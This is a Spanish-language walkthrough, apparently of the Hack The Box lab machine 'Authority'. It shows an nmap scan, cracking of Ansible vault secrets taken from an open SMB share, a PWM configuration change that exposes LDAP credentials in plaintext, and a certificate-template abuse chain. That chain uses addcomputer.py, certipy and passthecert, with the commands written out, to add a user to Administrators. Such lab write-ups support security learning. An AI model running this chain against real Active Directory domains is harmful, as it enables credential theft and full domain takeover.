---------
 - Tags: #ldap #ldap-configurarion #template #certificates-templates #ansible #pwm #john 
-----------
## Técnicasutilizadas
- Ansible Decrypt
- Change of configuration to obtain credentials
- Certificates Templates abuse [Winpeas scan]
## Procedimiento

![[Pasted image 20230715115755.png]]

#### Reconocimiento
Si lanzamos un **nmap** podemos ver los siguientes puertos abiertos:
```ruby
nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8443,9389,47001,49664,49665,49666,49667,49671,49686,49687,49689,49690,49707,49711,49716,55171 10.129.197.192 -oN Ports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-15 12:14 MST
Nmap scan report for 10.129.197.192
Host is up (0.13s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-15 23:09:41Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername:<unsupported>, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2023-07-15T23:10:50+00:00; +3h55m20s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2023-07-15T23:10:50+00:00; +3h55m20s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername:<unsupported>, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername:<unsupported>, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2023-07-15T23:10:50+00:00; +3h55m20s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername:<unsupported>, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2023-07-15T23:10:50+00:00; +3h55m20s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8443/tcp  open  ssl/https-alt
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
| ssl-cert: Subject: commonName=172.16.2.118
| Not valid before: 2023-07-11T14:45:07
|_Not valid after:  2025-07-13T02:23:31
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Sat, 15 Jul 2023 23:09:48 GMT
|     Connection: close
|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Sat, 15 Jul 2023 23:09:47 GMT
|     Connection: close
|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET, HEAD, POST, OPTIONS
|     Content-Length: 0
|     Date: Sat, 15 Jul 2023 23:09:47 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1936
|     Date: Sat, 15 Jul 2023 23:09:54 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Invalid character found in the HTTP protocol [RTSP&#47;1.00x0d0x0a0x0d0x0a...]</p><p><b>Description</b> The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49687/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  msrpc         Microsoft Windows RPC
49707/tcp open  msrpc         Microsoft Windows RPC
49711/tcp open  msrpc         Microsoft Windows RPC
49716/tcp open  msrpc         Microsoft Windows RPC
55171/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.93%T=SSL%I=7%D=7/15%Time=64B2F013%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;c
SF:harset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Sat,\x2015\x20Ju
SF:l\x202023\x2023:09:47\x20GMT\r\nConnection:\x20close\r\n\r\n\n\n\n\n\n<
SF:html><head><meta\x20http-equiv=\"refresh\"\x20content=\"0;URL='/pwm'\"/
SF:></head></html>")%r(HTTPOptions,7D,"HTTP/1\.1\x20200\x20\r\nAllow:\x20G
SF:ET,\x20HEAD,\x20POST,\x20OPTIONS\r\nContent-Length:\x200\r\nDate:\x20Sa
SF:t,\x2015\x20Jul\x202023\x2023:09:47\x20GMT\r\nConnection:\x20close\r\n\
SF:r\n")%r(FourOhFourRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20
SF:text/html;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Sat,\
SF:x2015\x20Jul\x202023\x2023:09:48\x20GMT\r\nConnection:\x20close\r\n\r\n
SF:\n\n\n\n\n<html><head><meta\x20http-equiv=\"refresh\"\x20content=\"0;UR
SF:L='/pwm'\"/></head></html>")%r(RTSPRequest,82C,"HTTP/1\.1\x20400\x20\r\
SF:nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en\r\
SF:nContent-Length:\x201936\r\nDate:\x20Sat,\x2015\x20Jul\x202023\x2023:09
SF::54\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><html\x20la
SF:ng=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20
SF:Request</title><style\x20type=\"text/css\">body\x20{font-family:Tahoma,
SF:Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;background
SF:-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px;}\
SF:x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:bla
SF:ck;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;}</s
SF:tyle></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20R
SF:equest</h1><hr\x20class=\"line\"\x20/><p><b>Type</b>\x20Exception\x20Re
SF:port</p><p><b>Message</b>\x20Invalid\x20character\x20found\x20in\x20the
SF:\x20HTTP\x20protocol\x20\[RTSP&#47;1\.00x0d0x0a0x0d0x0a\.\.\.\]</p><p><
SF:b>Description</b>\x20The\x20server\x20cannot\x20or\x20will\x20not\x20pr
SF:ocess\x20the\x20request\x20due\x20to\x20something\x20that\x20is\x20perc
SF:eived\x20to\x20be\x20a\x20client\x20error\x20\(e\.g\.,\x20malformed\x20
SF:request\x20syntax,\x20invalid\x20");
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-07-15T23:10:41
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
|_clock-skew: mean: 3h55m19s, deviation: 0s, median: 3h55m19s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.14 seconds
```

SI lanzamos un **whatweb** sobre la web, podemos ver las siguientes tecnologías corriendo por detrás:
```ruby
whatweb 10.129.197.192
http://10.129.197.192 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.129.197.192], Microsoft-IIS[10.0], Title[IIS Windows Server]
```

-----------
#### Ansible decrypt
Podemos encontrar que el puerto SMB (445) no requiere autentificación para ver los archivos compartidos a nivel de red. Vemos que hay un archivo que cuenta con pares de credenciales encryptadas:
![[Pasted image 20230716223734.png]]

Podemos coger estos hashes y pasarlos con **Ansible2John** para obtener un hash que posteriormente podemos crackear con **John**:
![[Pasted image 20230716223816.png]]

Una vez con la credencial, podemos hacer lo siguiente para ver las credenciales en texto plano:
```
# cat hash3 | ansible-vault decrypt
Vault password: !@#$%^&*
Decryption successful
DevT3st@123
```

Y hacemos lo mismo con los otros hashes y obtenemos un total de dos contraseñas y un usuario:
![[Pasted image 20230716224238.png]]

---------
#### Change of configuration to obtain credentials
Con la credenciales de **svc_pwm** podemos entrar al **ConfigurationManager** del sitio web que se hospeda en el puerto **8443**:
![[Pasted image 20230716224527.png]]

Esto nos dara acceso a un dashboard donde se encuentra la configuración **LDAP** del sitio, podemos inspeccionar en la base de datos, en archivos de configuración en las wordlists del servicio. Echandole un ojo al archivo de configuración encontramos las siguientes instrucciones:
![[Pasted image 20230716224707.png]]

Basicamente nos dice que podemos añadir una propiedad: **storePlaintextValues** y que esta tenga el valor de **true**, con esto podriamos ver las credenciales en texto plano. Entonces quedaria asi:
![[Pasted image 20230716224810.png]]

Ahora, si subimos este archivo de configuración, probablemente nos cierre la sesión. Volvemos a iniciar sesión y descargamos el archivo de configuración y vemos las credenciales en texto plano:
![[Pasted image 20230716225004.png]]

Con estas credenciales podemos conectarnos a la maquina a través del servicio de **WinRM** con el usuario **svc_ldap**:
![[Pasted image 20230716225148.png]]

--------
#### Certificates Templates abuse [Winpeas scan]
Subimos WinPEAS al sistema y lo ejecutamos para enumerar en profundidad las posibles formas de escalar privilegios.
Encontramos un **Certificado** contiene una vulnerabilidad:
![[Pasted image 20230716230113.png]]

Para explotarlo haremos uso de **impacket-addcomputer**, **Certify** y por ultimo **passthecert** para conectarnos a una Shell de **Ldap** y agregar nuestro usuario al grupo **Administrators**.
Primero añadiremos una nueva maquina con el siguiente comando:
```
# addcomputer.py authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!' -computer-name vulnSystem$ -computer-pass 123456 -method LDAPS
```

Luego de esto, generaremos un **.pfx** con el cual podremos generar un **.key** y un **.crt** que nos serviran para conectarnos a la **LDAP-SHELL**:
```
# certipy req -u vulnSystem$ -p 123456 -ca AUTHORITY-CA -target authority.htb -template CorpVPN -upn administrator@authority.htb -dns authority.authority.htb -dc-ip 10.129.11.56
```

Esto nos dejara **administrator_authority.pfx**. Luego generamos la **Key** y el **Cert**:
```
# certipy cert -pfx administrator_authority.pfx -nokey -out user.crt && certipy cert -pfx administrator_authority.pfx -nocert -out user.key 
```

Y ahora nos contactamos con **PassTheCert**:
```
# python3 passthecert.py -action ldap-shell -crt ../../user.crt -key ../../user.key -domain authority.htb -dc-ip 10.129.11.56
```

Agregamos el usuario **svc_ldap** al grupo **administrators**:
```ruby
# python3 passthecert.py -action ldap-shell -crt ../../user.crt -key ../../user.key -domain authority.htb -dc-ip 10.129.11.56
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Type help for list of commands
 
# add_user_to_group svc_ldap administrators
```

Ahora nos podemos conectar con **Evil-WinRM** con el usuario **svc_ldap** y tendremos todos los privilegios de administrador y visualizar la flag:
![[Pasted image 20230716231749.png]]
